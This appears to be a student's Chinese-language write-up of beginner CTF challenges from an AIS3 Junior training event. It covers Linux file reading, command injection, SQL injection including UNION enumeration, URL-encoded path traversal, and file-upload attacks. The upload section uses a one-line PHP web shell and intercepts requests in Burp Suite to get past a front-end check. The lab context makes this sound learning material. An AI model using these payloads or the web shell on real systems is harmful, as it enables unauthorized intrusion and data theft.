# **AIS3 Junior 2026 Day1 Writeup : Web&Linux**

## Basic

### **Linux-1**

> 首先題目跟Linux的指令有關，題目給了該目錄的內容
> 目標是找flag

![image](https://hackmd.io/_uploads/SkdB341Uzx.png)

先用 `cat`分別讀取三個txt看看

1. notes.txt
printer queue moved to the new office rack.

2. todo.txt
 - review backup script
 - verify disk usage
 - rotate old logs

3. welcome.txt
 Welcome to the Linux practice box.
Try basic commands like pwd, ls, and cat>

基於 welcome.txt 先試 `pwd`

![image](https://hackmd.io/_uploads/BJQ1gSJLGe.png)

目前在 /app，但似乎沒啥用
結果注意到，flag就在目錄那邊

![image](https://hackmd.io/_uploads/r1FoxByLfe.png)

`cat flag`來讀取就得到flag了

![image](https://hackmd.io/_uploads/Hke6er18Gx.png)

### Linux-2

> 這次題目不會再開局就給那麼多東西

![image](https://hackmd.io/_uploads/r1Ns-ryLGl.png)

先試試看ls看目前的目錄

![image](https://hackmd.io/_uploads/HJEzfHkUGx.png)

跟上一題目差不多，只不過沒有flag
那使用看`ls ../`上一層有啥

![image](https://hackmd.io/_uploads/rywszBy8Mg.png)

看到這邊的flag了
使用 `cat ../flag `讀取上一層的另外一個(flag)

![image](https://hackmd.io/_uploads/ry3YXSy8fx.png)

### Linux-3

> 根據描述，我猜測跟上次的流程差不多，只不過不能用 cat (最常被拿來讀檔的那個指令)

![image](https://hackmd.io/_uploads/ryxk4BJ8Ml.png)

直接使用 `ls ../` 看看上一層

![image](https://hackmd.io/_uploads/ByKaVSJ8ze.png)

果然差不多，也看到flag，只不過沒有辦法使用cat
我去問AI讀取檔案除了cat，還有什麼
他告訴我有less跟more
先試試看`less ../flag`

![image](https://hackmd.io/_uploads/SyXkUrJ8zx.png)

不知道是語法寫錯還怎樣，反正我換成` more ../flag `看看

![image](https://hackmd.io/_uploads/Syu88SyIfg.png)

找到flag了

## WEB
 
### Command Injection-1

> 這題類似於前面的 Basic，都跟指令有關

![image](https://hackmd.io/_uploads/BJWaz8k8Gx.png)

我先嘗試` ls` 跟 `pwd`，結果都無效

![image](https://hackmd.io/_uploads/r1HBmLk8Me.png)

![image](https://hackmd.io/_uploads/HkkwQUkUMe.png)

改輸入` 0;`，使用 ; 截斷前面的內容避免被擋

![image](https://hackmd.io/_uploads/rJJZ6U1Ize.png)

使用`0; ls ../`　退回上一層並列出找到flag.txt

![image](https://hackmd.io/_uploads/S1-J0LyLfl.png)

最後使用 `0; cat ../flag.txt` 成功找到flag

![image](https://hackmd.io/_uploads/HyBXC8JIGe.png)

### Command Injection-2

![image](https://hackmd.io/_uploads/SJARRU1LGe.png)

我先嘗試隨意輸入，看輸出為何

![image](https://hackmd.io/_uploads/HyAVMOyIGg.png)

注意到其結構為` {input}.crop.local`
使用與先前相同的拼接技巧即可
`0;cat ../flag.txt;`

![image](https://hackmd.io/_uploads/HJEXmdyIMg.png)


### Command Injection-3

> 這題不能輸入，他提示 Default target

![image](https://hackmd.io/_uploads/rJXskDJIMx.png)

嘗試尋找哪裡有 target，按F12看看ＨＴＭＬ，發現對應的target那邊寫在前端，顯示 hidden

![image](https://hackmd.io/_uploads/B15FlP18Mg.png)

把hidden刪掉，就會變成可以輸入的狀態

![image](https://hackmd.io/_uploads/B1FVbw1Ifl.png)

使用前面的`0; cat ../flag.txt `即可找到flag

![image](https://hackmd.io/_uploads/Hkh9WDy8zl.png)

### SQLi-1

> 看起來很正常的一個登入介面
> 這題跟 SQL Injection 有關

![image](https://hackmd.io/_uploads/r1TdvSk8Gx.png)

使用萬用的 `' or '1' = '1' -- -`
其中的 ' 因為是一對的，若在前面加上'，他會被截斷在那邊
原本是'{username}'會變成'{username}'加上其他東西
`{username}／{password} or '1' = '1' `當中的or是只要滿足一個即可
而`1=1`恆成立，` -- `則會把後面變成注釋，後方的東西就會被無視
後面的 `－`是為了確保 `--` 後面有空格，避免某些情況解析失敗
在兩個欄位都輸入`' or '1' = '1' -- -`即可拿到flag

![image](https://hackmd.io/_uploads/Hye2iH1Lzl.png)

### SQLi-2

> 這次要先輸入帳號密碼才能進入

![image](https://hackmd.io/_uploads/HkXSgU1Uzl.png)

![image](https://hackmd.io/_uploads/r1iUeL1UMg.png)

進去後長這樣

![image](https://hackmd.io/_uploads/rJw9eI1Ize.png)

在搜尋那邊使用上題的`' or '1' = '1' -- -`就能直接查找到，多了個商品叫做 x7F9qL2mN0pR4，其商品介紹那欄就有flag了

![image](https://hackmd.io/_uploads/BynrWUy8Me.png)

### SQLi-3

同 **SQLi-2** 的商品頁面，似乎是union型的

![image](https://hackmd.io/_uploads/rySo9Y1Ufg.png)

使用 `0 ' UNION SELECT name,sql,type FROM sqlite_master -- `
其中的 0 可以讓DB不會比對到任何資料，也不會報錯，這樣指令輸出就會有 UNION 後面的東西了
這邊是列舉 DB 的結構

![image](https://hackmd.io/_uploads/B1-CkClIfx.png)

secret_notes 的價格那欗有flag
把name改成flag，NULL用來填充其他欄位，因為還有兩個不需要的欄位，所以需要兩個

使用`0 ' UNION SELECT flag,NULL,NULL FROM secret_notes  -- `　就能到flag了

![image](https://hackmd.io/_uploads/SkXyWCeUGe.png)

### Path Traversal

> 點進去長這樣

![image](https://hackmd.io/_uploads/Bk7S4O1UMg.png)

我先隨意輸入 Mujica 看看輸出

![image](https://hackmd.io/_uploads/HJ0kB_J8Ml.png)

輸入 `cat　../../flag.txt 沒反應`


![image](https://hackmd.io/_uploads/HylrIdyIGe.png)
看來在 Path Traversal中，後端已經主動讀取了，輸入這個會被視為檔名，試試看直接輸入 `../../flag.txt`，發現改成這樣會被視為路徑，就成功了

![image](https://hackmd.io/_uploads/r1rhDukLMx.png)

### Path Traversal-2

![image](https://hackmd.io/_uploads/r1CR2v18Mg.png)

這次`../`被擋住了

![image](https://hackmd.io/_uploads/B10E6w18Mx.png)

URL 有替代字符可以繞過
`.` **->** `%2e`
`/` **->** `%2f`

將` ../../flag.txt `轉成 `%2e%2e%2f%2e%2e%2fflag%2etxt`
即可得到flag

![image](https://hackmd.io/_uploads/HkUnRwJUfe.png)

### File Upload-1

> 這邊是跟上傳檔案相關的

![image](https://hackmd.io/_uploads/S1h7_UyLMg.png)
![image](https://hackmd.io/_uploads/HJSSu81UMe.png)

先創造一個簡單的php
透過system語法執行shell
`<?php system($_GET['qqq']);?>`　(原本是用cmd，在跟助教溝通時臨時改的)
我創建了一個檔案名為 114514.php 並將其上傳

![image](https://hackmd.io/_uploads/HyzD9IkLGx.png)

我們得知了其路徑 `/uploads/84b98400/114514.php` ，將其貼到URL後面，會看到這個

![image](https://hackmd.io/_uploads/S1A-s81Izl.png)
上面提到qqq，所以我使用`?qqq= `加在後面，並可以在＝後面輸入指令，輸入ls進行測試

![image](https://hackmd.io/_uploads/HJ9k2IJIMe.png)

題目開頭有提示 目標目錄 /var/www/html
所以我先` ls ../../`發現 flag.txt
最後正是抓取使用` cat ../../flag.txt` 找到flag

![image](https://hackmd.io/_uploads/Byoh3I18fg.png)

**備註：這題算上助教，當初花了３０分鐘卡在加路徑那邊，結果發現是 ' 不知道為何在linux裡面選擇英文輸入法卻會輸入中文的單引號**

### File Upload-2

跟前面那題長很像，不過前端不能上傳php了

![image](https://hackmd.io/_uploads/By1NSAe8fg.png)

![image](https://hackmd.io/_uploads/B15qBCxUzl.png)

要開啟 burp suite

![image](https://hackmd.io/_uploads/rk7e9AlUMx.png)

因為他說只能傳圖檔，所以我把上一題用的 `114514.php` 先改為 `114514.jpg`

然後把 burp 的封包攔截打開，從那邊開一個額外的chromium，從那開啟網頁，並上傳修改過的檔案

![image](https://hackmd.io/_uploads/SkaAZzL8Me.png)

將檔案再改回`php`，就能繞過了
因為他把限制做在了前端，所以能直接抓封包

剩下要做的跟之前差不多

不太一樣的是，burp 會把每次送出的請求攔截，所以要在 burp 那邊按Forward

![image](https://hackmd.io/_uploads/ByJa7GLUGx.png)

找到/var/www/html -> 找到flag.txt

`cd ../../;cat flag.txt`

得到flag

`FLAG{frontend_validation_bypass}`